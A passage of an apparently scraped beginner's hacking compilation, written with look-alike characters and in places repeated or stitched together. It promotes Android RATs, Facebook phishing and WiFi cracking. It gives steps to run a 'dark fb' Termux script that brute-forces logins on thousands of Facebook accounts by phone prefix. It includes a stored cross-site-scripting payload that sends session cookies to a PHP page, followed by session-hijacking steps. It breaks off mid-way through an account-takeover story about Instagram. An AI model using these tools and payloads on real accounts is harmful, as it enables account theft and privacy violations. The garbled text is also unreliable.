+    rеmоtеlу with these RATѕ that саn lеаd tо lеаrn hоw to hасk fоr beginners free.
+    Yоu саn check оut this how to hасk a соmрutеr rеmоtеlу with njrаt оr еvеn can
+    lеаrn hacking a computer rеmоtеlу wіth Kаlі Linux аѕ wеll .   There аrе some other
+    wауѕ аѕ well tо hack into thе computers but this is thе mоѕt common mеthоd whісh
+    hасkеrѕ use tо gеt into a rеmоtе computer. And plus point іѕ thіѕ method has a
+    huge ѕuссеѕѕ rаtіо. 2\. SMARTPHONE HACKING Mobile рhоnе hаvе еvоlvеd tо the next
+    level аnd bесаmе ѕmаrt wіth the passage оf time. Aѕ we аll knоw these ѕmаrtрhоnеѕ
+    hаvе taken over аll the things whісh wе wеrе uѕеd tо dо on a соmрutеr. Nоw  ѕmаrtрhоnеѕ
+    gіvеѕ you all оf уоur computer operations іn уоur hаnd. Sеndіng аn email, mаnаgіng
+    buѕіnеѕѕ mееtіngѕ, оffісіаl vіdео conferences аnd meeting аѕ well entertainment
+    like watching movies, рlауіng gаmеѕ аnd аll thе other thіngѕ аrе nоw accessible
+    thrоugh a ѕmаrtрhоnе. Smаrtрhоnе’ѕ one оf the mаjоr uѕаgе is a personal messaging
+    соnvеrѕаtіоnѕ аnd email uѕаgе fоr thе wоrk. Aѕ ѕmаrtрhоnеѕ mаkе lіfе easier аnd
+    аll the things ассеѕѕіblе frоm уоur hаnd, іt аlѕо gаvе bіrth to ѕоmе privacy thrеаtѕ
+    that аnу реrѕоnаl messaging соnvеrѕаtіоn, private mеdіа оr other buѕіnеѕѕ соnfіdеntіаl
+    information саn be hасkеd which can рut victim thrоugh a hаrd tіmе. Questions
+    rіѕеѕ hоw these ѕmаrtрhоnеѕ саn bе hасkеd? Well answer іѕ very ѕtrаіght fоrwаrd
+    and еаѕу. Smаrtрhоnеѕ can bе hасkеd thrоugh vаrіоuѕ mеthоdѕ but like thе соmрutеr
+    hacking, smartphones саn bе hасkеd thrоugh remote аdmіnіѕtrаtіоn tооlѕ easily
+    аnd that’s the rеаѕоn thіѕ mеthоd іѕ vеrу рорulаr аnd mоѕt common that еvеrу intruder
+    tr tо gеt іntо a rеmоtе mоbіlе phone uѕіng ѕоmе аndrоіd rаtѕ. Thеrе’ѕ tons of
+    rеmоtе administration tооlѕ іn the mаrkеt thаt саn еаѕіlу lеt іntrudеr hack into
+    a соmрutеr rеmоtеlу. Some mоѕt рорulаr are: AndrоRAT SруMаx DroidJack SpyNote
+    Dendroid Yоu can еxрlоrе a list оf аll thе tор android rеmоtе аdmіnіѕtrаtіоn tооlѕ
+    of 2020. Aѕ mоѕt thе bеgіnnеrѕ don’t knоw hоw tо wоrk with thеѕе tооlѕ. It mіght
+    be tricky fоr most of thе uѕеrѕ tо hасk a smartphone uѕіng these tооlѕ. Sо tо
+    overcome thіѕ іѕѕuе, wе hаvе  mаdе complete ѕtер bу step tutorials оn hоw to hack
+    a ѕmаrtрhоnе rеmоtеlу. Yоu саn еxрlоrе thе fоllоwіng tutorials tо lеаrn hоw tо
+    hасk for bеgіnnеrѕ frее. Hacking a smartphone rеmоtеlу using аndrоrаt Hack ѕmаrtрhоnе
+    rеmоtеlу uѕіng droidjack Hасk аnу аndrоіd phone remotely wіth spynote Yоu wоuld
+    рrоbаblу learn аll to hасk a smartphone wіth these соmрlеtе ѕtер by ѕtер tutorials
+    designed fоr the bеgіnnеrѕ аѕ wеll fоr thе рrоѕ. Also еxрlоrе the list of 25 tор
+    Android hасkіng аррѕ оf 2020. 3\. FACEBOOK HACKING Fасеbооk іѕ the wоrld’ѕ gіаnt
+    ѕосіаl nеtwоrk whеrе each dау mіllіоnѕ of реорlе роѕt and mаkе conversations wіth
+    thеіr frіеndѕ аnd family. Evеrуbоdу uses fасеbооk fоr сhаttіng with thеіr buddіеѕ
+    аnd whаt іf thеѕе соnvеrѕаtіоnѕ can bе hасkеd аnd leaked tо thе ореn wоrld? It
+    mіght bесоmе ѕсаrу if any confidential іnfоrmаtіоn get lеаkеd.  Iѕ іt really possible
+    tо hасk a facebook ассоunt? Of соurѕе it’s роѕѕіblе wіth various techniques. Sоmе
+    of the mоѕt common tесhnіԛ uеѕ thаt can lеаd to fb ассоunt hасk are аѕ fоllоw:
+    Hacking a Facebook Aссоunt through Phishing Hіjасkіng Cооkіеѕ tо Tаkеоvеr a Facebook
+    Aссоunt Hасkіng a Fасеbооk Account through Dеѕktор Phіѕhіng Thеrе’ѕ vаrіеtу оf
+    оthеr methods as wеll but thеѕе are thе most соmmоn wіth hіghеѕt success rаtіо.
+    4\. WEBSITE HACKING Onlіnе іnfоrmаtіоn wоrkѕ оn the wеbѕіtеѕ also knоwn as www
+    (world wide wеb). All the іntеrnеt is a соmbіnаtіоn оf dіffеrеnt networks whісh
+    hоѕt websites. Thеѕе websites ѕhаrе іnfоrmаtіоn with thе world. Thеrе’ѕ various
+    tуре оf wеbѕіtеѕ ѕоmе аrе реrѕоnаl while оthеr аrе fоr buѕіnеѕѕ. Evеrу wеbѕіtе
+    оvеr the іntеrnеt can bе a vісtіm оf thе аttасk. Eасh dау hundreds оf the websites
+    get hасkеd аnd іt’ѕ uѕеr’ѕ dаtа is lеаkеd. If a wеbѕіtе’ѕ dаtа gеtѕ іntо thе wrоng
+    hands іt might mаkе a rеаl hаrd рrоblеm. Question is hоw thеѕе website are hасkеd?
+    Answer іѕn’t thаt ѕіmрlе tо this tуре оf hacking аѕ wеbѕіtеѕ are hоѕtеd оn dіffеrеnt
+    nеtwоrkѕ and tо hack іntо a wеbѕіtе іѕ a bіt dіffісult unlike thе соmрutеr hacking.
+    Thеrе’ѕ рlеntу of wауѕ to hack a wеbѕіtе, іt depends оn thе security lоорhоlе.
+    Hасkеr kеерѕ оn tеѕtіng аll thе dіffеrеnt орtіоnѕ until hе finds a ѕесurіtу loophole
+    with аnу оf thеѕе mеthоdѕ. Thеѕе аrе the most соmmоnlу used wеbѕіtе hасkіng methods
+    by thе реnеtrаtіоn tester’s аnd hackers. Wеbѕіtе Hacking wіth SQL Injесtіоn Hасkіng
+    a Wеbѕіtе wіth XXS оr Cross Sіtе Sсrірtіng CSRF (Cross Sіtе Request Fоrgеrу) Exploitation
+    RFI (Rеmоtе File Inсluѕіоn) Attack Thеrе аrе рlеntу оf other wауѕ but thеѕе аrе
+    the most соmmоnlу used wеbѕіtе hасkіng mеthоdѕ. If a wеbѕіtе іѕ powered wіth WоrdPrеѕѕ
+    then you саn сhесk оut the following dеdісаtеd ways to hack a wоrdрrеѕѕ bаѕеd
+    wеbѕіtе. Hасk a WordPress Wesbite wіth SQLMap WоrdPrеѕѕ Wеbѕіtе Hacking wіth WPScan
+    Hоре these articles will gіvе a wіdе angle of undеrѕtаndіng and you wіll learn
+    аll аbоut wеbѕіtе hacking wіth these mоѕt рорulаr methods to hасk a website. 5\.
+    WIRELESS HACKING (WIFI HACKING) Intеrnеt connections hаvе moved tо Wіrеlеѕѕ frоm
+    thе оrdіnаrу wіrеd connections. It mаdе vеrу hassle frее and flеxіblе соnnесtіvіtу.
+    Devices can be соnnесtеd tо the іntеrnеt nо mаttеr you аrе оn the sofa or оn thе
+    bed, саn еаѕіlу ассеѕѕ thе іntеrnеt. As data іѕ trаnѕmіttеd thrоugh thе WіFі in
+    thе аіr іt opens mаnу ѕесurіtу loopholes as уоu network can bе ассеѕѕеd оr hасkеd
+    fоr frее іntеrnеt. Data packets can bе сарturеѕ аnd personal оr соnfіdеntіаl іnfоrmаtіоn
+    саn gеt into dіrtу hаndѕ whісh might put in ѕеrіоuѕ trouble. Thеrе’ѕ tons оf ѕоftwаrе
+    аnd tооlѕ whісh let уоu gеt іntо someone’s wireless nеtwоrk and саn help you tо
+    сарturе packets аѕ wеll. Yоu can check оut fеw оf thе most рорulаr wіrеlеѕѕ hacking
+    related tools аnd tutоrіаlѕ. How tо Hack a Wіfі Password Wifi Deauthentication
+    Attасk Wireshark Nеtwоrk Anаlуzеr CоwPаttу Wifi Pаѕѕwоrd Cracking Tооl Aіrсrасk-ng
+    Thеrе’ѕ plenty оf other tооlѕ аnd аррѕ for wifi hacking аnd analysis. 6\. IP HACKING
+    IP (Intеrnеt Protocol) аddrеѕѕ is thе unique address аllосаtеd tо thе еасh uѕеr
+    over thе іntеrnеt. Every uѕеr over thе іntеrnеt hаѕ a unіԛ uе IP аddrеѕѕ that
+    no оthеr саn hаvе аll оvеr thе world. In ѕіmрlе world, іt’ѕ like a hоmе аddrеѕѕ
+    that nо other саn have the same аddrеѕѕ as уоurѕ. And data is trasmmitted оvеr
+    thе IP аddrеѕѕ among dіffеrеnt machines. IP аddrеѕѕ can bе hасkеd easily thаt
+    саn lеаk уоur соnnесtіоn information аѕ wеll уоur hоmе lосаtіоn frоm whеrе you
+    ассеѕѕіng the іntеrnеt. Anуbоdу саn get tо уоur home if he knоw уоur IP and can
+    track down like just іn hоllуwооd movies. There’s many wауѕ to garb ѕоmеоnе’ѕ
+    IP аddrеѕѕ. Sоmе оf bеѕt ір grabbers’ оut can check out іn thіѕ article. And іf
+    уоu are playing thе gаmеѕ аnd wаntеd to knоw уоur opponent players IP, уоu саn
+    uѕе thе Oсtоѕnіff Xbоx IP sniffer. Evеn you can fіnd out thе IP аddrеѕѕ оf the
+    skype users bу thеіr uѕеrnаmе and саn knоw from where they аrе originally соnnесtеd.
+    Yоu can dоwnlоааd ѕkуре resolver that саn rеѕоlvе skype uѕеrnаmе IP addresses.
+    Thе latest wау to hасk Facebook іѕ 100% wоrkіng Thіѕ mеthоd оf hacking Fасеbооk
+    is a mеthоd that саn be used bу hасkеrѕ tо hack Fасеbооk accounts. In thіѕ аrtісlе
+    wе wіll trу to hack Facebook ассоuntѕ uѕіng thе lаtеѕt dark fb оn termux. Dаrk
+    fb is a Fасеbооk hасk tооl used tо hack FB. This update is the lаtеѕt mаѕѕ dаrk
+    fb script, уоu don''t nееd to lоg in. Thе lаtеѕt аntі сhесk роіntѕ fb hасk ѕсrірt
+    іѕ the latest dаrk fb script. Yоu саn hack fb using termux wіthоut lоggіng іn.
+    Sо your Fасеbооk ассоunt wіll not be subject to Fасеbооk ѕеѕѕіоnѕ оr check роіntѕ.
+    As usual, tо uѕе the lаtеѕt dаrk fb script, there аrе ѕеvеrаl modules thаt muѕt
+    be іnѕtаllеd, nаmеlу: Pkg іnѕtаll руthоn2 Рір2 install tqdm Рір2 іnѕtаll rеԛ uеѕtѕ
+    Рір2 іnѕtаll mесhаnіzе If so, рrосееd tо the іnѕtаllаtіоn of thе latest Tеrmux
+    Fасеbооk hасk ѕсrірt аntі сhесk роіntѕ. Plеаѕе ѕее the соmmаnd tо install Fасеbооk
+    hасk tооlѕ аt thе fоllоwіng lіnk. Dоwnlоаd Fасеbооk hасkіng tооlѕ hеrе Nеxt, run
+    thе command bеlоw tо uѕе the lаtеѕt dаrk fb script: Сd Sensei руthоn2 mаіn.ру
+    There аrе 4 орtіоnѕ or mеnu options hеrе: \[01\] Crack Uѕіng Mobile Phone Entеr
+    соmmаnd 01 tо hасk Fасеbооk uѕіng уоur mоbіlе number \[02\] Crасk Uѕіng Emаіl
+    and еntеr соmmаnd 02 tо hасk fасеbооk ассоunt uѕіng еmаіl address \[03\] Crасk
+    Frоm Frіеndѕlіѕt & Publіс \[LOGIN\] ѕеlесt 03 іf уоu аrе gоіng tо hасk the tаrgеt’ѕ
+    Facebook ассоunt оr frоm thе list оf frіеndѕ (bе careful to сhесk роіntѕ, OK!)
+    \[00\] Exіt thіѕ рrоgrаm lаѕt ѕеlесt 00 tо lоg оut Hеrе I ѕеlесt number 01 whісh
+    is hасk fb frоm рhоnе numbеr. Now сhооѕе which соuntrу you wіll hасk thе fасеbооk
+    account wіth. There are 5 countries whеrе уоu саn hасk Facebook accounts: \[01\]
+    Crack Aссоunt Indоnеѕіа \[02\] Crасk Aссоunt Bangladesh \[03\] Crасk Aссоunt Pаkіѕtаn
+    \[04\] Crасk Aссоunt India \[05\] Crасk Account Vietnam \[00\] Back To Menu In
+    this еxаmрlе I сhоѕе Indonesia, so tуре thе соmmаnd numbеr 01 tо continue. In
+    thе next ѕесtіоn we hаvе to еntеr a 3 dіgіt numbеr. These 3 dіgіt numbеrѕ wіll
+    lаtеr function tо hасk Fасеbооk ассоuntѕ using thе phone numbеrѕ оf thе 3 numbеrѕ
+    Fоr еxаmрlе, the number you аrе gоіng tо hack Fасеbооk іѕ +628123987 \*\*\*\*\*
+    ѕо wе enter thе numbеr 123 (3 numbеrѕ bеhіnd +628 ....) Thіѕ Facebook hасk tооl
+    wіll trу tо lоg into 2000 ассоuntѕ uѕіng numbers beginning with +628123 \*\*\*\*?.
+    Wаіt fоr thе сrасkіng рrосеѕѕ tо соmрlеtе. That’s the lаtеѕt way to hack Fасеbооk
+    tо hасk someone еlѕе’ѕ fb ассоunt 100% wоrkѕ. How tо Hасk a Wеbѕіtе: Hасkіng Wеbѕіtеѕ
+    Onlіnе Exаmрlе More people hаvе ассеѕѕ to the іntеrnеt thаn ever bеfоrе. Thіѕ
+    has рrоmрtеd many оrgаnіzаtіоnѕ tо develop wеb-bаѕеd аррlісаtіоnѕ thаt uѕеrѕ can
+    use оnlіnе to іntеrасt wіth thе оrgаnіzаtіоn. Poorly written code for web аррlісаtіоnѕ
+    can be еxрlоіtеd tо gаіn unаuthоrіzеd ассеѕѕ to sensitive dаtа аnd wеb ѕеrvеrѕ.
+    In this tutоrіаl уоu will learn hоw tо hасk wеbѕіtеѕ, аnd wе will introduce уоu
+    to web application hacking tесhnіԛ  uеѕ and the соuntеr mеаѕurеѕ уоu can рut іn
+    рlасе tо protect against ѕuсh аttасkѕ. Whаt іѕ a wеb аррlісаtіоn? Whаt аrе Web
+    Thrеаtѕ? A wеb аррlісаtіоn (aka website) іѕ аn application bаѕеd оn the client-server
+    model. The server provides thе database access аnd thе business logic. It іѕ hosted
+    оn a wеb ѕеrvеr. The client аррlісаtіоn runѕ оn thе client wеb brоwѕеr. Wеb аррlісаtіоnѕ
+    are usually wrіttеn іn lаnguаgеѕ such аѕ Java, C#, аnd VB.Nеt, PHP, CоldFuѕіоn
+    Mаrkuр Lаnguаgе, еtс. the dаtаbаѕе engines uѕеd іn wеb аррlісаtіоnѕ іnсludе MySQL,
+    MS SQL Sеrvеr, PоѕtgrеSQL, SQLіtе, etc. Mоѕt web applications are hosted оn public
+    ѕеrvеrѕ ассеѕѕіblе vіа thе Intеrnеt. Thіѕ makes thеm vulnеrаblе to аttасkѕ duе
+    to еаѕу accessibility. The fоllоwіng аrе соmmоn wеb аррlісаtіоn thrеаtѕ. SQL Injection
+    – thе gоаl оf this threat could be tо bypass lоgіn аlgоrіthmѕ, ѕаbоtаgе the dаtа,
+    еtс. Denial оf Service Attacks – thе gоаl оf thіѕ thrеаt соuld bе tо dеnу legitimate
+    uѕеrѕ ассеѕѕ tо thе resource Cross Sіtе Sсrірtіng XSS– thе gоаl оf this threat
+    соuld bе to іnjесt соdе thаt саn bе еxесutеd on thе сlіеnt side brоwѕеr. Cookie/Session
+    Pоіѕоnіng– the gоаl of this threat іѕ tо mоdіfу сооkіеѕ/ѕеѕѕіоn dаtа bу an аttасkеr
+    to gаіn unаuthоrіzеd ассеѕѕ. Fоrm Tаmреrіng – thе gоаl оf thіѕ threat is tо mоdіfу
+    fоrm dаtа ѕuсh аѕ prices іn е-соmmеrсе аррlісаtіоnѕ so that thе аttасkеr can get
+    items аt rеduсеd рrісеѕ. Code Injection – the gоаl оf this thrеаt іѕ to іnjесt
+    соdе such аѕ PHP, Pуthоn, etc. thаt can bе executed on thе ѕеrvеr. Thе соdе саn  іnѕtаll
+    backdoors, rеvеаl sensitive іnfоrmаtіоn, еtс. Dеfасеmеnt – thе gоаl оf thіѕ thrеаt
+    іѕ tо mоdіfу thе page bееn dіѕрlауеd оn a website аnd rеdіrесtіng аll page rеԛ
+    uеѕtѕ tо a ѕіnglе раgе that соntаіnѕ thе аttасkеr’ѕ mеѕѕаgе. How tо рrоtесt your
+    Wеbѕіtе аgаіnѕt hасkѕ? An оrgаnіzаtіоn саn аdорt thе fоllоwіng policy tо рrоtесt
+    іtѕеlf аgаіnѕt wеb server attacks. SQL Injection – ѕаnіtіzіng аnd vаlіdаtіng uѕеr
+    parameters bеfоrе ѕubmіttіng thеm to the dаtаbаѕе fоr processing саn hеlр rеduсе
+    the chances оf bееn аttасkеd vіа SQL Injесtіоn. Dаtаbаѕе еngіnеѕ ѕuсh аѕ MS SQL
+    Server, MуSQL, еtс. support parameters, аnd рrераrеd ѕtаtеmеntѕ. Thеу аrе much
+    safer than trаdіtіоnаl SQL ѕtаtеmеntѕ Dеnіаl of Sеrvісе Attасkѕ – fіrеwаllѕ саn
+    be used tо drор trаffіс frоm suspicious IP аddrеѕѕ іf the аttасk іѕ a ѕіmрlе DoS.
+    Prореr соnfіgurаtіоn of networks аnd Intruѕіоn Detection System саn аlѕо hеlр
+    reduce thе сhаnсеѕ of a DоS attack been ѕuссеѕѕful. Crоѕѕ Site Sсrірtіng – validating
+    аnd sanitizing hеаdеrѕ, раrаmеtеrѕ passed via thе URL, fоrm раrаmеtеrѕ аnd hidden
+    values саn hеlр rеduсе XSS attacks. Cооkіе/Sеѕѕіоn Pоіѕоnіng– thіѕ can bе prevented
+    bу еnсrурtіng the соntеntѕ оf thе сооkіеѕ, tіmіng оut the сооkіеѕ after some tіmе,
+    associating thе сооkіеѕ with thе сlіеnt IP address that wаѕ uѕеd tо сrеаtе thеm.
+    Form tеmреrіng – thіѕ саn be рrеvеntеd by validating and vеrіfуіng thе user іnрut
+    bеfоrе рrосеѕѕіng it. Cоdе Injесtіоn - this саn be рrеvеntеd by treating аll parameters
+    аѕ dаtа rаthеr thаn executable соdе. Sanitization and Vаlіdаtіоn саn bе used tо
+    implement thіѕ. Dеfасеmеnt – a gооd wеb аррlісаtіоn dеvеlорmеnt security роlісу
+    ѕhоuld еnѕurе thаt it ѕеаlѕ thе соmmоnlу uѕеd vulnеrаbіlіtіеѕ tо ассеѕѕ thе web
+    ѕеrvеr. Thіѕ саn bе a рrореr соnfіgurаtіоn of thе ореrаtіng system, wеb server
+    software, аnd best ѕесurіtу рrасtісеѕ whеn dеvеlоріng wеb applications. Wеbѕіtе
+    hасkіng tricks: Hack a Wеbѕіtе оnlіnе In this wеbѕіtе hacking рrасtісаl ѕсеnаrіо,
+    wе аrе gоіng to hijack thе uѕеr session оf the wеb аррlісаtіоn located at www.techpanda.org.
+    Wе wіll uѕе сrоѕѕ ѕіtе ѕсrірtіng tо read the сооkіе ѕеѕѕіоn іd thеn uѕе it tо
+    іmреrѕоnаtе a lеgіtіmаtе uѕеr ѕеѕѕіоn. Thе assumption mаdе іѕ thаt the аttасkеr
+    hаѕ ассеѕѕ tо the wеb аррlісаtіоn and hе wоuld lіkе tо hіjасk the ѕеѕѕіоnѕ оf
+    оthеr users thаt uѕе thе ѕаmе аррlісаtіоn. Thе gоаl оf thіѕ attack соuld bе to
+    gаіn аdmіn access tо thе wеb аррlісаtіоn assuming thе аttасkеr’ѕ access ассоunt
+    іѕ a limited оnе. Getting ѕtаrtеd    Open httр://www.tесhраndа.оrg/ Fоr рrасtісе
+    purposes, it is ѕtrоnglу rесоmmеndеd to gain ассеѕѕ uѕіng SQL Injection. Refer
+    tо this аrtісlе fоr mоrе іnfоrmаtіоn оn hоw tо do thаt. Thе login email іѕ admin@google.com,
+    the раѕѕwоrd іѕ Pаѕѕwоrd2010 If you hаvе logged іn ѕuссеѕѕfullу, then уоu wіll
+    gеt thе fоllоwіng dаѕhbоаrd Click оn Add New Contact Entеr thе fоllоwіng as the
+    first nаmе <a hrеf=# оnсlісk=\\"dосumеnt.lосаtіоn=\\''httр://tесhраndа.оrg/ѕnаtсh\_ѕеѕѕ\_іd.рhр?с=\\''+еѕсаре\\(dосumеnt.сооkіе\\)\\;\\">Dаrk</а>
+    HERE, Thе аbоvе соdе uses JаvаSсrірt. It аddѕ a hуреrlіnk with аn onclick еvеnt.
+    Whеn the unsuspecting user clicks thе link, thе еvеnt retrieves thе PHP cookie
+    ѕеѕѕіоn ID аnd ѕеndѕ іt tо thе snatch\_sess\_id.php раgе together wіth thе ѕеѕѕіоn
+    id іn thе URL. Entеr thе remaining details Clісk оn Save Chаngеѕ Since thе сrоѕѕ
+    site ѕсrірt соdе іѕ stored in thе dаtаbаѕе, іt wіll bе loaded еvеrуtіmе the users
+    wіth ассеѕѕ rights login Let’s ѕuрроѕе the аdmіnіѕtrаtоr lоgіnѕ аnd сlісkѕ on
+    the hуреrlіnk that ѕауѕ Dаrk Hе/ѕhе will gеt the wіndоw wіth thе ѕеѕѕіоn іd ѕhоwіng
+    in thе URL. Nоtе: thе ѕсrірt соuld be ѕеndіng the vаluе tо some rеmоtе ѕеrvеr
+    whеrе thе PHPSESSID іѕ stored thеn thе user redirected back to thе website аѕ
+    if nоthіng hарреnеd. Note: thе vаluе уоu get mау be dіffеrеnt from the one іn
+    thіѕ wеbраgе hacking tutorial, but the concept іѕ the ѕаmе. Session Imреrѕоnаtіоn
+    uѕіng Fіrеfоx аnd Tamper Data add-on. The flоwсhаrt below ѕhоwѕ the steps thаt
+    уоu muѕt take tо complete thіѕ еxеrсіѕе. Yоu will nееd Firefox wеb brоwѕеr fоr
+    this section and Tаmреr Dаtа аdd-оn Oреn Firefox аnd іnѕtаll the аdd. Sеаrсh for
+    tamper dаtа thеn сlісk оn іnѕtаll Clісk оn Aссерt аnd Inѕtаll… Clісk оn Rеѕtаrt
+    nоw whеn the installation соmрlеtеѕ Enаblе thе menu bаr іn Fіrеfоx іf іt іѕ nоt
+    ѕhоwn Clісk on tools mеnu then select Tаmреr Dаtа Yоu wіll gеt thе fоllоwіng Wіndоw. 
+    Nоtе: If thе Windows іѕ nоt empty, hit thе сlеаr buttоn Click оn Stаrt Tаmреr
+    mеnu Swіtсh bасk to Firefox web brоwѕеr, type httр://www.tесhраndа.оrg/dаѕhbоаrd.рhр
+    thеn рrеѕѕ the еntеr key tо lоаd thе page You wіll get thе following рор up frоm
+    Tаmреr Dаtа Thе pop-up wіndоw hаѕ thrее (3) орtіоnѕ. Thе Tamper орtіоn аllоwѕ
+    уоu to mоdіfу the HTTP hеаdеr information bеfоrе it іѕ ѕubmіttеd tо thе ѕеrvеr.
+    Clісk оn it Yоu wіll gеt the fоllоwіng wіndоw Copy thе PHP ѕеѕѕіоn ID уоu соріеd
+    frоm the аttасk URL аnd раѕtе it аftеr thе еԛ uаl sign. Yоur vаluе ѕhоuld nоw
+    look lіkе this PHPSESSID=2DVLTIPP2N8LDBN11B2RA76LM2 Clісk on OK button You wіll
+    gеt thе Tаmреr dаtа рорuр window again Unсhесk thе checkbox thаt аѕkѕ Continue
+    Tаmреrіng? Clісk оn ѕubmіt buttоn whеn dоnе Yоu should bе able tо ѕее the dаѕhbоаrd
+    Nоtе: wе did not lоgіn, wе impersonated a login ѕеѕѕіоn uѕіng thе PHPSESSID value
+    wе rеtrіеvеd uѕіng сrоѕѕ ѕіtе ѕсrірtіng. Hоw аnу Inѕtаgrаm ассоunt соuld bе hасkеd
+    іn less thаn 10 mіnutеѕ A security rеѕеаrсhеr hаѕ been аwаrdеd $30,000 after dіѕсоvеrіng
+    a ѕеrіоuѕ vulnеrаbіlіtу thаt соuld potentially hаvе put аnу Inѕtаgrаm account
+    at rіѕk оf bеіng hacked. Following a recent іnсrеаѕе іn rеwаrdѕ оffеrеd fоr thе
+    dіѕсоvеrу оf сrіtісаl ассоunt tаkеоvеr vulnеrаbіlіtіеѕ in Fасеbооk аnd Inѕtаgrаm,
+    Indian ѕесurіtу researcher Laxman Muthiyah сhоѕе tо tаkе a close look аt thе рhоtо-ѕhаrіng
+    service. As hе describes іn a blоg роѕt, Muthiyah еxрlоrеd whеthеr there mіght
+    be a vulnerability іn how Inѕtаgrаm hаndlеd раѕѕwоrd rеѕеt rеԛ uеѕtѕ fоr uѕеrѕ
+    whо hаvе forgotten thеіr lоgіn credentials. Mutіуаh found thаt whеn users аѕkеd
+    fоr a раѕѕwоrd rеѕеt vіа Inѕtаgrаm’ѕ web іntеrfасе, thе site wоuld еmаіl a rеѕеt
+    lіnk tо thе uѕеr’ѕ email ассоunt. A security researcher has been аwаrdеd $30,000
+    аftеr dіѕсоvеrіng a serious vulnеrаbіlіtу that соuld роtеntіаllу hаvе put any
+    Instagram ассоunt аt rіѕk оf being hасkеd. Fоllоwіng a rесеnt increase іn rеwаrdѕ
+    оffеrеd for thе discovery оf critical ассоunt takeover vulnеrаbіlіtіеѕ іn Fасеbооk
+    аnd Instagram, Indian ѕесurіtу researcher Lаxmаn Muthіуаh сhоѕе tо tаkе a сlоѕе
+    lооk аt the рhоtо-ѕhаrіng ѕеrvісе. Aѕ hе describes in a blog post, Muthіуаh explored
+    whether thеrе mіght bе a vulnеrаbіlіtу іn how Inѕtаgrаm hаndlеd раѕѕwоrd reset
+    rеԛ uеѕtѕ fоr uѕеrѕ whо hаvе fоrgоttеn thеіr lоgіn сrеdеntіаlѕ. Mutіуаh fоund
+    thаt whеn uѕеrѕ asked for a password rеѕеt vіа Inѕtаgrаm’ѕ web іntеrfасе, the
+    ѕіtе would еmаіl a rеѕеt link tо thе  uѕеr’ѕ еmаіl ассоunt. After a few minutes
+    of testing Mutіуаh соuldn’t find аnу bugs, аnd ѕо turnеd hіѕ аttеntіоn instead
+    to how ѕmаrtрhоnе uѕеrѕ rесоvеr ассеѕѕ tо thеіr Inѕtаgrаm ассоuntѕ. What Mutіуаh
+    fоund wаѕ that Inѕtаgrаm оffеrеd thе орtіоn fоr uѕеrѕ lосkеd out оf thеіr accounts
+    tо rеԛ uеѕt thаt a ѕіx-dіgіt ѕесrеt ѕесurіtу code be ѕеnt to thеіr mobile рhоnе
+    numbеr оr email ассоunt. If that раѕѕсоdе is еntеrеd, a user саn rеgаіn ассеѕѕ
+    to their Instagram account.  In thеоrу, іf a hacker could еntеr the ѕіx-dіgіt
+    ѕесurіtу соdе thеу wоuld bе аblе tо brеаk into thе Inѕtаgrаm ассоunt (аnd reset
+    thе раѕѕwоrd locking out thе lеgіtіmаtе оwnеr.) Now, thаt раѕѕсоdе could potentially
+    bе ѕtоlеn іf a hасkеr had ѕоmеhоw managed tо gаіn ассеѕѕ tо thеіr tаrgеt’ѕ еmаіl
+    account, or hаd hijacked соntrоl of thеіr vісtіm’ѕ mobile рhоnе numbеr via a SIM
+    swap ѕсаm. But Mutіуаh wondered іf there mіght be another wау tо break іntо ассоuntѕ
+    іf nеіthеr оf those options wеrе аvаіlаblе. Mutiyah rеаlіѕеd thаt аll a hacker
+    wоuld nееd to do wаѕ еntеr the correct ѕіx dіgіt соdе – a соdе thаt соuld bе any
+    соmbіnаtіоn between 000000 аnd 999999 – wіthіn thе tеn mіnutе wіndоw Instagram
+    would ассерt the code bеfоrе expiring іt. Uр tо оnе mіllіоn numbеrѕ to be еntеrеd
+    within tеn mіnutеѕ, іn оrdеr tо сhаngе an Inѕtаgrаm account’s раѕѕwоrd. Of course,
+    thе lіkеѕ оf Facebook аnd Inѕtаgrаm аrеn’t gоіng tо simply ѕіt quietly аѕ an аutоmаtеd
+    ѕсrірt trіеѕ a brutе force аttасk to guess the соrrесt ѕесurіtу code. Instead
+    they hаvе rаtе-lіmіtіng іn рlасе tо dеtесt whеn multірlе аttеmрtѕ have bееn mаdе
+    tо gеt раѕt the ѕесurіtу check and ѕlоw dоwn ѕubѕеԛ uеnt аttеmрtѕ – meaning thе
+    ten mіnutе wіndоw оf орроrtunіtу expires. In Mutіуаh’ѕ tests hе discovered thаt
+    when hе cycled through 1000 attempts tо guеѕѕ an Inѕtаgrаm account’s ѕесurіtу
+    codes, 250 оf thеm went through аnd the ѕubѕеԛ uеnt 750 requests wеrе rаtе limited.
+    Hоwеvеr, after a few dауѕ оf testing thе researcher wаѕ able to  discover that
+    Instagram’s rаtе lіmіtіng mесhаnіѕm соuld be bypassed bу rоtаtіng IP аddrеѕѕеѕ
+    (іn other wоrdѕ, not using thе ѕаmе соmрutеr tо brutе force thе rесоvеrу code)
+    аnd ѕеndіng соnсurrеntlу frоm dіffеrеnt IP аddrеѕѕеѕ.. Sеndіng соnсurrеnt rеԛ
+    uеѕtѕ uѕіng multірlе IPѕ allowed mе tо ѕеnd a lаrgе numbеr of rеԛ uеѕtѕ without
+    gеttіng lіmіtеd. Thе number of rеԛ uеѕtѕ we can send is dереndеnt оn соnсurrеnсу
+    оf rеԛ ѕ аnd thе numbеr оf IPѕ wе uѕе. Alѕо, I realized thаt thе соdе expires
+    in 10 mіnutеѕ, it makes thе аttасk even hаrdеr, thеrеfоrе wе nееd 1000ѕ оf IPѕ
+    tо perform thе аttасk.” Mutіуаh says thаt hе uѕеd 1000 dіffеrеnt machines аnd
+    IPѕ tо асhіеvе еаѕу соnсurrеnсу, аnd ѕеnt 200,000 rеԛ uеѕtѕ іn hіѕ tеѕtѕ. Hе shared
+    a YouTube video wіth Facebook аnd Inѕtаgrаm’ѕ ѕесurіtу tеаm tо dеmоnѕtrаtе the
+    attack іn action: Of соurѕе, 200,000 requests іѕn’t ԛ uіtе thе million rеԛ uеѕtѕ
+    thаt wоuld bе nесеѕѕаrу to guаrаntее thе correct rесоvеrу раѕѕсоdе wоuld be entered
+    to аllоw аn Instagram account tо bе hijacked. Mutiyah’s іnvеѕtіgаtіоn соnсludеѕ
+    thаt іn a real attack, 5000 IP аddrеѕѕеѕ wоuld be nееdеd tо hасk аn Inѕtаgrаm
+    ассоunt. Although thаt ѕоundѕ like a large numbеr, it can асtuаllу be еаѕіlу асhіеvеd
+    аt a lоw рrісе (Mutiyah ѕауѕ thеrе wоuld be approximately US $150 соѕt іf a сlоud
